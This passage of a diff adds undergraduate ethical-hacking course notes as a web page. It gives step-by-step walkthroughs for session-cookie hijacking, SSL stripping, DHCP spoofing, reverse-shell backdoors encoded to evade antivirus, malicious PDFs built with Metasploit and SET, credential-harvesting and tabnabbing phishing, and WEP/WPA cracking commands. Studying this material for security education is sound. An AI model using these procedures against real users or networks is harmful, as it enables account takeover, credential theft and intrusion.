+<li>Right-click on the cookie field, then select Copy → Bytes → Copy printable text only. Save the authentication cookies and delete others.</li>
+</ul>
+</li>
+</ol>
+<p>Hijacking the Session</p>
+<ol>
+<li><strong>Inject Cookies in Browser</strong>:
+<ul>
+<li>Use a browser plug-in like “Cookie Manager” in Firefox.</li>
+<li>Browse to <a href="http://facebook.com/">facebook.com</a> and launch the “Cookie Manager” plug-in from the tools menu.</li>
+<li>Click on the “Add” button to inject the captured cookies.</li>
+</ul>
+</li>
+<li><strong>Log in to Victim’s Account</strong>:
+<ul>
+<li>After injecting the cookies, refresh the page to log in to the victim’s account.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>SSL Strip: Stripping HTTPS Traffic</p>
+<p><strong>Purpose</strong>: SSL Strip is used to capture secure HTTPS traffic by converting it to HTTP.</p>
+<ul>
+<li>
+<p><strong>Functionality</strong>:</p>
+<ul>
+<li>Replaces HTTPS links with HTTP.</li>
+<li>Strips secure cookies, making them transmit over HTTP.</li>
+<li>Replaces favicon with a padlock icon to maintain a secure appearance.</li>
+</ul>
+</li>
+<li>
+<p><strong>Requirements</strong>:</p>
+<ul>
+<li>Implement ARP spoofing before running SSL Strip.</li>
+<li>Enable port forwarding.</li>
+</ul>
+</li>
+<li>
+<p><strong>Usage</strong>:</p>
+<ol>
+<li>
+<p><strong>Navigate to SSL Strip Directory</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /pentest/web/ssltrip
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Execute SSL Strip</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./sslstrip.py –l <span class="m">8080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>The <code>l</code> parameter makes SSL Strip listen on port 8080.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Result</strong>: Victim&rsquo;s HTTPS connections are forced to HTTP, allowing packet capture tools to capture traffic, which can also be viewed in the <code>sslstrip.log</code> file.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Yamas</p>
+<p>Yamas automates man in the middle attacks using tools like arpspoof, ettercap, and SSL Strip.</p>
+<ul>
+<li>
+<p><strong>Usage</strong>:</p>
+<ol>
+<li>
+<p><strong>Launch Yamas</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">yamas
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Configuration Steps</strong>:</p>
+<ul>
+<li>Set the port number to redirect traffic from (default: 8080) and to (default: 80).</li>
+<li>Choose the output file (default option recommended).</li>
+<li>Enter the default gateway and network interface (e.g., gateway: 192.168.15.1, interface: eth0).</li>
+<li>Yamas will scan the network for valid hosts and target them.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Result</strong>: Yamas poisons the network and captures plain text credentials, displaying them in a passwords window.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>DHCP spoofing</p>
+<ul>
+<li><strong>Purpose:</strong> DHCP (Dynamic Host Configuration Protocol) assigns IP addresses and network settings to devices on a network. In a DHCP spoofing attack, an attacker intercepts this process to manipulate the victim&rsquo;s network configuration.</li>
+<li><strong>Steps to Perform a DHCP Spoofing Attack:</strong>
+<ol>
+<li><strong>Intercept DHCP Requests:</strong>
+<ul>
+<li>Send a DHCP reply to the victim before the legitimate DHCP server does.</li>
+</ul>
+</li>
+<li><strong>Manipulate Network Settings:</strong>
+<ul>
+<li>Assign a specific IP address to the victim.</li>
+<li>Set the default gateway to the attacker’s IP address.</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>Change the DNS address to a desired IP.</li>
+</ul>
+</li>
+<li><strong>Attack Outcomes:</strong>
+<ul>
+<li><strong>Denial of Service (DoS):</strong> Set the victim’s gateway to a non-existing IP to disrupt network access.</li>
+<li><strong>Traffic Interception:</strong> Redirect the victim’s gateway to the attacker’s IP to capture and analyze all network traffic.</li>
+</ul>
+</li>
+<li><strong>Procedure Using MITM Menu:</strong>
+<ol>
+<li><strong>Select DHCP Spoofing:</strong>
+<ul>
+<li>Enter details for IP pool, netmask, and DNS server IP.</li>
+<li>IP Pool: Optional; if not provided, it uses the current DHCP server.</li>
+<li>Netmask: Typically 255.255.255.0.</li>
+<li>DNS Server: The attacker’s IP address.</li>
+</ul>
+</li>
+<li><strong>Execute the Attack:</strong>
+<ul>
+<li>Click &ldquo;OK&rdquo; to start the attack.</li>
+</ul>
+</li>
+<li><strong>Trigger on Victim’s Machine:</strong>
+<ul>
+<li>Release current DHCP lease: <code>ipconfig/release</code></li>
+<li>Request a new IP address: <code>ipconfig/renew</code></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+</details></p>
+
+
+
+<p><details >
+  <summary markdown="span">Chapter 6: Remote exploitation</summary>
+  <ul>
+<li>
+<p>Client-Side Exploitation Methods:</p>
+<ol>
+<li><strong>E-Mails Leading to Malicious Attachments:</strong>
+<ul>
+<li>Send the victim malicious files (e.g., PDF, exe, mp3) to download and execute.</li>
+<li>Execution opens a meterpreter session on the victim’s machine.</li>
+</ul>
+</li>
+<li><strong>E-Mails Leading to Malicious Links:</strong>
+<ul>
+<li>Send malicious links for the victim to click.</li>
+<li>Links may lead to fake log-in pages or web servers with malicious code.</li>
+<li>Execution in the browser opens a meterpreter session.</li>
+</ul>
+</li>
+<li><strong>Compromising Client-Side Update:</strong>
+<ul>
+<li>Replace software updates with malicious code.</li>
+<li>When the victim updates the software, they download and execute the attacker’s code.</li>
+</ul>
+</li>
+<li><strong>Malware Loaded on USB Sticks:</strong>
+<ul>
+<li>Load malicious files on a USB stick.</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>Upon insertion, the malicious code executes automatically, opening a meterpreter session.</li>
+</ul>
+</li>
+<li>
+<p>Creating a Custom Executable with SET:</p>
+<ul>
+<li><strong>Overview:</strong> Custom executables can be difficult to get victims to execute and may need to bypass antivirus detection.</li>
+<li><strong>Metasploit Encoding:</strong> Use Metasploit’s encoding mechanisms to evade antivirus software. Alternatively, use paid crypters from black hat forums to make the executable fully undetectable (FUD).</li>
+<li><strong>Creating a Backdoor with SET:</strong>
+<ol>
+<li>
+<p><strong>Navigate to SET Directory:</strong></p>
+<ul>
+<li>Command: <code>cd /pentest/exploits/set</code></li>
+<li>Command: <code>./set</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Choose Attack Vector:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 23.13.56.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.13.56.png"></p>
+<ul>
+<li>Press “1” for social engineering attack vectors.</li>
+<li>Select “Create a payload and a listener.”</li>
+</ul>
+</li>
+<li>
+<p><strong>Set Reverse IP:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 23.14.13.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.14.13.png"></p>
+<ul>
+<li>Provide your local IP address.</li>
+<li>For Internet attacks, configure port forwarding on your router.</li>
+</ul>
+</li>
+<li>
+<p><strong>Choose Payload:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 23.14.31.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.14.31.png"></p>
+<ul>
+<li>Example: “Windows Shell Reverse_TCP” for a reverse shell back to the attacker’s IP.</li>
+</ul>
+</li>
+<li>
+<p><strong>Select Encoding:</strong></p>
+<ul>
+<li>Use “shikata_ga_nai” encoding.</li>
+<li>Encode multiple times to bypass antivirus detection.</li>
+</ul>
+</li>
+<li>
+<p><strong>Set Listening Port:</strong></p>
+<ul>
+<li>Example: Port “4444”.</li>
+</ul>
+</li>
+<li>
+<p><strong>Create and Execute Backdoor:</strong></p>
+<ul>
+<li>Backdoor created as <code>msf.exe</code> in the root directory.</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>Convince the victim to execute it, opening a meterpreter session.</li>
+<li><strong>Interacting with the Shell:</strong>
+<ul>
+<li>Command: <code>sessions –i 1</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>PDF attack</p>
+<ul>
+<li>
+<p>Basic Structure of a PDF File</p>
+<p><img alt="Screenshot 2024-06-12 at 23.19.12.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.19.12.png"></p>
+<ul>
+<li>Header: Specifies the PDF version.</li>
+<li>Body: Contains objects and names.</li>
+<li>Cross Reference Table: Specifies object locations.</li>
+<li>Trailer: Contains information for rendering the PDF.</li>
+</ul>
+</li>
+<li>
+<p>PDF Launch Action</p>
+<ul>
+<li>Allows launching other files or applications along with a PDF.</li>
+<li>Previously abused for spreading malware like Zeus botnets.</li>
+<li>Can be manipulated to execute malicious actions on opening the PDF.</li>
+<li><strong>Creating a PDF Document with a Launch Action:</strong>
+<ol>
+<li>
+<p>Create a blank PDF file.</p>
+</li>
+<li>
+<p>Open it in a text editor like Notepad or WordPad.</p>
+</li>
+<li>
+<p>Add a launch action syntax:</p>
+<p><img alt="original" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.21.20.png"></p>
+<p>original</p>
+<p><img alt="modified" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.21.41.png"></p>
+<p>modified</p>
+<pre tabindex="0"><code>/Type/Action
+/S/Launch
+/Win&lt;&lt;
+/F (calc.exe)
+</code></pre><ul>
+<li>
+<p><code>/S</code>: Type of action (launch).</p>
+</li>
+<li>
+<p><code>/Win</code>: Operating system (Windows).</p>
+</li>
+<li>
+<p><code>/F</code>: Application to run (<code>calc.exe</code> in this case).</p>
+</li>
+<li>
+<p><strong>Controlling Dialog Boxes:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 23.22.14.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_23.22.14.png"></p>
+<ul>
+<li>
+<p>To avoid suspicion and control dialog boxes, add lines like:</p>
+<pre tabindex="0"><code>/p (The file has too many errors in it...)
+</code></pre><ul>
+<li><code>/p</code>: Passes an additional parameter.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>PDF recoinassance</p>
+<ul>
+<li>
+<p>PDFINFO</p>
+<p><img alt="Screenshot 2024-06-13 at 09.56.07.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_09.56.07.png"></p>
+<ul>
+<li>
+<p><strong>Purpose</strong>: Command-line Unix tool for gathering metadata from PDF documents.</p>
+</li>
+<li>
+<p><strong>Usage Example</strong>:</p>
+<pre tabindex="0"><code>PDFINFO &#34;Your PDF Document&#34;
+</code></pre></li>
+<li>
+<p><strong>Information Extracted</strong>: Author&rsquo;s name, PDF software used (e.g., &ldquo;Microsoft Word 2010&rdquo;), operating system, and PDF reader version.</p>
+</li>
+<li>
+<p><strong>Significance</strong>: Knowing the software and version used to create a PDF can help identify potential vulnerabilities or exploits for social engineering attacks.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>PDFTK</p>
+<p><img alt="Screenshot 2024-06-13 at 09.56.27.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_09.56.27.png"></p>
+<ul>
+<li><strong>Purpose</strong>: Tool for generating and manipulating PDF files, including combining and compressing PDFs.</li>
+<li><strong>Comparison</strong>: Less efficient compared to the Origami Framework.</li>
+</ul>
+</li>
+<li>
+<p>Origami Framework</p>
+<p><img alt="Screenshot 2024-06-13 at 09.56.51.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_09.56.51.png"></p>
+<ul>
+<li><strong>Purpose</strong>: Tool for creating and manipulating PDF documents more efficiently than PDFTK.</li>
+<li><strong>Installation on BackTrack</strong>:
+<ol>
+<li>
+<p>Download the latest release:</p>
+<pre tabindex="0"><code>wget &lt;http://seclabs.org/origami/files/origami-last.tar.gz&gt;
+</code></pre></li>
+<li>
+<p>Extract the contents:</p>
+<pre tabindex="0"><code>tar xzvf origami-last.tar.gz
+</code></pre></li>
+<li>
+<p>Locate the framework in the directory &ldquo;origami-1.0.0-beta1&rdquo;.</p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Metasploitable</p>
+<ul>
+<li>
+<p><strong>Search PDF Exploits</strong>:
+Displays available PDF exploits in Metasploit.</p>
+<p><img alt="Screenshot 2024-06-13 at 10.02.45.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_10.02.45.png"></p>
+<pre tabindex="0"><code>search pdf
+</code></pre></li>
+<li>
+<p>Types of PDF Exploits</p>
+<ol>
+<li><strong>Fileformat Exploits</strong>:
+<ul>
+<li>Commonly used by penetration testers.</li>
+<li>Create a malicious PDF that gives the attacker control over the victim&rsquo;s computer when opened.</li>
+<li>Can infect all PDF files on the victim&rsquo;s computer.</li>
+</ul>
+</li>
+<li><strong>Browser Exploits</strong>:
+<ul>
+<li>Less common but useful in specific situations.</li>
+<li>Steps:
+<ol>
+<li>Choose a browser PDF exploit module.</li>
+<li>Set up Metasploit&rsquo;s built-in webserver with the PDF exploit.</li>
+<li>Send the exploit URL to the victim via social engineering.</li>
+<li>Victim clicks the URL, triggering the exploit.</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>Real-World Scenario 1</p>
+<ul>
+<li><strong>Example</strong>: Emailing a malicious PDF to the CEO of a company, posing as the IT department to trick the CEO into opening the file and executing the exploit.</li>
+</ul>
+</li>
+<li>
+<p>Real-World Scenario 2</p>
+<ol>
+<li><strong>Fake Log-In Page</strong>:
+<ul>
+<li>Set up a fake log-in page resembling a legitimate website (e.g., <a href="http://facebook.com/">facebook.com</a>).</li>
+<li>Send the victim a link to this fake page (e.g., <a href="http://facebookfakepage.freehost.com/">facebookfakepage.freehost.com</a>).</li>
+<li>The victim logs in, unknowingly providing their credentials to the attacker.</li>
+</ul>
+</li>
+<li><strong>DNS Spoofing on Same Network</strong>:
+<ul>
+<li>If on the same network as the victim, launch a DNS spoofing attack.</li>
+<li>Replace the IP address of the legitimate site (e.g., <a href="http://facebook.com/">facebook.com</a>) with the IP of the fake log-in page.</li>
+<li>The victim logs into the fake page when attempting to visit the legitimate site.</li>
+</ul>
+</li>
+<li><strong>Redirecting to Malicious Webserver</strong>:
+<ul>
+<li>Perform DNS spoofing to redirect the victim to a malicious webserver.</li>
+<li>Use browser exploits on the malicious webserver to compromise the victim&rsquo;s browser.</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>Adobe PDF Embedded EXE Exploit</p>
+<ul>
+<li>
+<p>A popular Metasploit exploit embedding an executable in a PDF to exploit vulnerabilities in older Adobe Reader versions.</p>
+</li>
+<li>
+<p>Steps to Create a Malicious PDF with Metasploit</p>
+<ol>
+<li>
+<p><strong>Launch Metasploit</strong>:</p>
+<pre tabindex="0"><code>msfconsole
+</code></pre></li>
+<li>
+<p><strong>Use the Exploit</strong>:</p>
+<pre tabindex="0"><code>use exploit/windows/fileformat/adobe_pdf_embedded_exe
+</code></pre></li>
+<li>
+<p><strong>Show Options</strong>:</p>
+<pre tabindex="0"><code>show options
+</code></pre><ul>
+<li>Use a predefined or custom PDF file for embedding.</li>
+</ul>
+</li>
+<li>
+<p><strong>Set Launch Message</strong> (optional):</p>
+<pre tabindex="0"><code>set LAUNCH_Message &lt;message&gt;
+</code></pre></li>
+<li>
+<p><strong>Choose Payload</strong>:</p>
+<pre tabindex="0"><code>set payload windows/meterpreter/reverse_tcp
+</code></pre><ul>
+<li>Set LHOST and LPORT.</li>
+</ul>
+</li>
+<li>
+<p><strong>Generate the Malicious PDF</strong>:</p>
+<pre tabindex="0"><code>exploit
+</code></pre><ul>
+<li>PDF is saved in <code>/root/.msf4/local/</code>.</li>
+</ul>
+</li>
+</ol>
+<p>Finally, send the malicious PDF to the victim and trick them into executing it to gain control over their system.</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Social Engineering Toolkit (SET)</p>
+<ul>
+<li>
+<p>Steps to Create a Malicious PDF with SET</p>
+<ol>
+<li><strong>Navigate to Social Engineering Attack Vectors</strong>:
+<ul>
+<li>Launch SET and navigate to the &ldquo;Social Engineering Attack Vectors&rdquo; menu.</li>
+<li>Press <code>3</code> to enter the “Infectious Media Generator” menu.</li>
+</ul>
+</li>
+<li><strong>Choose the Type of Exploit</strong>:
+<ul>
+<li>Select the type of exploit by pressing <code>1</code> for &ldquo;Fileformat exploits.&rdquo;</li>
+</ul>
+</li>
+<li><strong>Enter Reverse Connection IP</strong>:
+<ul>
+<li>Input the IP address of your machine (BackTrack box).</li>
+</ul>
+</li>
+<li><strong>Choose the Exploit Type</strong>:
+<ul>
+<li>Select the “Adobe PDF Embedded EXE” exploit.</li>
+</ul>
+</li>
+<li><strong>Use Own PDF or Template</strong>:
+<ul>
+<li>Choose whether to use your own PDF or a template available in SET.</li>
+</ul>
+</li>
+<li><strong>Select Payload</strong>:
+<ul>
+<li>Stick with the default payload “Windows/shell/reverse_tcp”.</li>
+</ul>
+</li>
+<li><strong>Enter Payload Listener IP and Port</strong>:
+<ul>
+<li>Provide the IP of your payload listener (same as your machine’s IP).</li>
+<li>Choose a port for the listener (ensure no other service is using this port).</li>
+</ul>
+</li>
+<li><strong>Enable Listener</strong>:
+<ul>
+<li>Confirm to enable the listener, which will start listening for incoming connections.</li>
+</ul>
+</li>
+</ol>
+<p>Once the victim opens the malicious PDF, you will receive a reverse connection to your machine.</p>
+<ul>
+<li>Summary of Commands
+<ol>
+<li>
+<p>Launch SET:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo setoolkit
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Navigate to Infectious Media Generator:</p>
+<ul>
+<li>Choose option <code>1</code> for &ldquo;Social Engineering Attacks&rdquo;</li>
+<li>Choose option <code>3</code> for &ldquo;Infectious Media Generator&rdquo;</li>
+</ul>
+</li>
+<li>
+<p>Select Fileformat Exploit:</p>
+<ul>
+<li>Press <code>1</code> for &ldquo;Fileformat exploits&rdquo;</li>
+</ul>
+</li>
+<li>
+<p>Enter Reverse Connection IP:</p>
+<pre tabindex="0"><code>Enter the IP address for the reverse connection: &lt;your_IP_address&gt;
+</code></pre></li>
+<li>
+<p>Select Adobe PDF Embedded EXE Exploit:</p>
+<pre tabindex="0"><code>Choose the exploit: 1 (Adobe PDF Embedded EXE)
+</code></pre></li>
+<li>
+<p>Use Own PDF or Template:</p>
+<pre tabindex="0"><code>Use your own PDF or template: &lt;choose&gt;
+</code></pre></li>
+<li>
+<p>Select Payload:</p>
+<pre tabindex="0"><code>Choose the payload: 1 (Windows/shell/reverse_tcp)
+</code></pre></li>
+<li>
+<p>Enter Payload Listener IP and Port:</p>
+<pre tabindex="0"><code>Enter IP address for the payload listener: &lt;your_IP_address&gt;
+Enter port for the listener: &lt;your_port_number&gt;
+</code></pre></li>
+<li>
+<p>Enable Listener:</p>
+<pre tabindex="0"><code>Enable the listener? (yes/no): yes
+</code></pre></li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Phishing attack</p>
+<ul>
+<li>SET
+<ul>
+<li>Credential Harvester Attack
+<ol>
+<li>
+<p><strong>Select Credential Harvester Attack</strong>:</p>
+<p><img alt="Screenshot 2024-06-13 at 10.14.21.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_10.14.21.png"></p>
+<ul>
+<li>From the website attack vectors menu, choose &ldquo;Credential Harvester Attack.&rdquo;</li>
+<li>Options: Use predefined templates, clone a site of your choice, or import your own template.</li>
+</ul>
+</li>
+<li>
+<p><strong>Enter IP Address</strong>:</p>
+<ul>
+<li>Enter the IP address where you want the captured credentials to be posted (local IP for LAN attacks).</li>
+</ul>
+</li>
+<li>
+<p><strong>Choose a Template</strong>:</p>
+<p><img alt="Screenshot 2024-06-13 at 10.14.40.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_10.14.40.png"></p>
+<ul>
+<li>Select a built-in template, e.g., <a href="http://gmail.com/">gmail.com</a>.</li>
+<li>The credential harvester is now running on the specified IP.</li>
+</ul>
+</li>
+<li>
+<p><strong>DNS Spoofing</strong>:</p>
+<p><img alt="Screenshot 2024-06-13 at 10.14.52.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_10.14.52.png"></p>
+<ul>
+<li>Perform a DNS spoofing attack by replacing the legitimate site&rsquo;s IP (e.g., <a href="http://gmail.com/">gmail.com</a>) with the attacker&rsquo;s IP.</li>
+<li>When the victim navigates to the attacker&rsquo;s IP, their credentials will be recorded and displayed.</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>Tabnabbing Attack
+<ul>
+<li>Tabnabbing is a phishing attack where the attacker changes the content of an inactive browser tab to a fake login page, capturing the victim&rsquo;s credentials when they return and attempt to log in.</li>
+<li>Steps to Perform a Tabnabbing Attack:
+<ol>
+<li>
+<p><strong>Select Tabnabbing Attack</strong>:</p>
+<ul>
+<li>From the attack vectors menu, choose &ldquo;Tabnabbing Attack.&rdquo;</li>
+<li>Select &ldquo;Web templates&rdquo; and click on &ldquo;Site Cloner.&rdquo;</li>
+</ul>
+</li>
+<li>
+<p><strong>Enter IP Address and Website to Clone</strong>:</p>
+<p><img alt="Screenshot 2024-06-13 at 10.16.05.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_10.16.05.png"></p>
+<ul>
+<li>Provide the IP address where the attack is hosted and the website to clone (e.g., <a href="http://gmail.com/">gmail.com</a>).</li>
+</ul>
+</li>
+<li>
+<p><strong>Launch the Attack</strong>:</p>
+<ul>
+<li>The attack is launched, and when the victim loads the site, it appears normal.</li>
+</ul>
+</li>
+<li>
+<p><strong>Victim Interaction</strong>:</p>
+<p><a href="https://www.notion.so">https://www.notion.so</a></p>
+<ul>
+<li>When the victim switches tabs, the inactive tab is redirected to a fake login page.</li>
+<li>Upon returning to the tab and entering credentials, the attacker captures the credentials.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>Browser exploitation
+<ul>
+<li>Attacking over the Internet
+<ul>
+<li>
+<p>Scnario</p>
+<p><img alt="Screenshot 2024-06-13 at 10.27.31.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-13_at_10.27.31.png"></p>
+<ol>
+<li><strong>Configure SET to Ask for Public IP:</strong> Turn off the AUTO_DETECT option in the set_config file to make SET ask for the public IP.</li>
+<li><strong>Make Your IP Address Static:</strong> Set your IP address to static, especially on the attacker machine (BackTrack 5 in this case).</li>
+<li><strong>Open Ports on the Router:</strong> Open two ports on the router - one for the SET external webserver (usually port 80 or 443) and another for receiving connections (e.g., port 4444). You can use the <code>nc</code> command to open ports.</li>
+<li><strong>Verify Open Ports:</strong> Use a tool like <a href="http://canyouseeme.org/">canyouseeme.org</a> to check if the ports are open.</li>
+</ol>
+<ul>
+<li>Using windows box as a router (Port Forwarding)
+<ul>
+<li>Local Port: The local port on the Windows machine (e.g., port 80).</li>
+<li>Remote Host: The IP address of the BackTrack box (e.g., 192.168.1.4).</li>
+<li>Remote Port: The port on which the malicious webserver is running on the BackTrack box (e.g., port 4444).</li>
+<li>Max Connections: Number of connections to set up.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+</details></p>
+
+
+
+<p><details >
+  <summary markdown="span">Chapter 11: Wireless</summary>
+  <ul>
+<li>
+<p>As wireless networks become more prevalent in homes and organizations, they also become more attractive targets for hackers. Unlike wired networks, wireless networks are susceptible to attacks due to their broadcast nature. This chapter will guide you through various attacks on wireless networks, including bypassing low-level security measures like hiding SSIDs and MAC filtering, cracking WEP/WPA/WPA2 keys, and setting up fake access points for client-side attacks.</p>
+</li>
+<li>
+<p>Requirements</p>
+<ul>
+<li><strong>Wireless Access Point</strong>: Necessary to avoid unethical attacks on others&rsquo; networks.</li>
+<li><strong>Wireless Adapter Supporting Packet Injection</strong>: Essential for performing attacks. The Alfa AWUS036H adapter is recommended due to its compatibility with BackTrack and support for packet injection and monitor mode.</li>
+</ul>
+</li>
+<li>
+<p>Setting Up</p>
+<ol>
+<li><strong>Connect Wireless Adapter to BackTrack VM</strong>: Attach the network adapter by navigating to <code>Vm → Removable Devices → Realtek RTL8187_Wireless → Connect (Disconnect from HOST)</code>.</li>
+<li><strong>Verify Adapter Detection</strong>: Use the command <code>iwconfig</code> to confirm detection.</li>
+<li><strong>Connect to Access Point</strong>: Use WICD Network Manager to connect to an appropriate access point and verify with <code>iwconfig</code>.</li>
+</ol>
+</li>
+<li>
+<p>Aircrack-ng Suite</p>
+<p>Aircrack-ng is a comprehensive toolset for cracking WEP/WPA/WPA2 keys, featuring tools like <code>airodump-ng</code>, <code>aireply-ng</code>, and <code>airmon-ng</code>.</p>
+</li>
+<li>
+<p>Uncovering Hidden SSIDs</p>
+<p>SSID hiding is a common but ineffective security measure. When a client reconnects, the SSID is transmitted in plain text. Two methods to uncover hidden SSIDs:</p>
+<ol>
+<li>
+<p><strong>Passive Observation</strong>: Wait for a client to reconnect.</p>
+</li>
+<li>
+<p><strong>Deauthentication Attack</strong>: Force clients to reconnect using the command:</p>
+<pre tabindex="0"><code>aireplay-ng -0 3 -a &lt;AP MAC address&gt; mon0
+</code></pre></li>
+</ol>
+</li>
+<li>
+<p>Cracking WEP</p>
+<ul>
+<li>
+<p>Monitor Mode</p>
+<p>To sniff wireless networks, switch the network card to monitor mode:</p>
+<pre tabindex="0"><code>airmon-ng start wlan0
+</code></pre><p>Confirm with <code>iwconfig</code>.</p>
+</li>
+<li>
+<p>Using Airodump-ng</p>
+<p>To monitor traffic and capture SSIDs:</p>
+<pre tabindex="0"><code>airodump-ng mon0
+</code></pre></li>
+<li>
+<p>Bypassing MAC Filters</p>
+<ol>
+<li>
+<p><strong>Scan for Networks</strong>:</p>
+<pre tabindex="0"><code>airodump-ng mon0
+</code></pre></li>
+<li>
+<p><strong>Identify Connected Clients</strong>:</p>
+<pre tabindex="0"><code>airodump-ng -c &lt;channel&gt; -a -bssid &lt;AP BSSID&gt; mon0
+</code></pre></li>
+<li>
+<p><strong>Spoof MAC Address</strong>:</p>
+<pre tabindex="0"><code>macchanger -m &lt;legitimate MAC address&gt; wlan0
+ifconfig wlan0 up
+</code></pre></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>Cracking WEP Networks</p>
+<ol>
+<li>
+<p><strong>Monitor Mode</strong>:</p>
+<pre tabindex="0"><code>airmon-ng start wlan0
+</code></pre></li>
+<li>
+<p><strong>Identify Target</strong>:</p>
+<pre tabindex="0"><code>airodump-ng mon0
+</code></pre></li>
+<li>
+<p><strong>Capture Data Packets</strong>:</p>
+<pre tabindex="0"><code>airodump-ng mon0 --bssid &lt;AP BSSID&gt; --channel &lt;channel&gt; --write &lt;filename&gt;
+</code></pre></li>
+<li>
+<p><strong>Fake Authentication</strong>:</p>
+<pre tabindex="0"><code>aireplay-ng -1 3 -a &lt;AP BSSID&gt; mon0
+</code></pre></li>
+<li>
+<p><strong>ARP Request Replay</strong>:</p>
+<pre tabindex="0"><code>aireplay-ng -3 -b &lt;AP BSSID&gt; -h &lt;mon0 MAC address&gt; mon0
+</code></pre></li>
+<li>
+<p><strong>Crack WEP Key</strong>:</p>
+<pre tabindex="0"><code>aircrack-ng &lt;capture file&gt;.cap
+</code></pre></li>
+</ol>
+</li>
+<li>
+<p>Cracking WPA/WPA2 Networks</p>
+<ol>
+<li>
+<p><strong>Monitor Mode</strong>:</p>
+<pre tabindex="0"><code>airmon-ng start wlan0
+</code></pre></li>
+<li>
+<p><strong>Identify Target</strong>:</p>
+<pre tabindex="0"><code>airodump-ng mon0
+</code></pre></li>
+<li>
+<p><strong>Capture Four-Way Handshake</strong>:</p>
+<pre tabindex="0"><code>airodump-ng -c &lt;channel&gt; -w &lt;filename&gt; --bssid &lt;AP BSSID&gt; mon0
+</code></pre></li>
+<li>
+<p><strong>Deauthentication Attack</strong>:</p>
+<pre tabindex="0"><code>aireplay-ng --deauth 10 -a &lt;AP BSSID&gt; -c &lt;client MAC address&gt; mon0
+</code></pre></li>
+<li>
+<p><strong>Crack WPA/WPA2 Key</strong>:</p>
+<pre tabindex="0"><code>aircrack-ng -w &lt;wordlist&gt; &lt;capture file&gt;.cap
+</code></pre></li>
+</ol>
+</li>
+</ul>
+
+</details></p>
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/notes/">Notes</a></li>
+      <li><a href="http://localhost:1313/tags/undergraduate/">Undergraduate</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
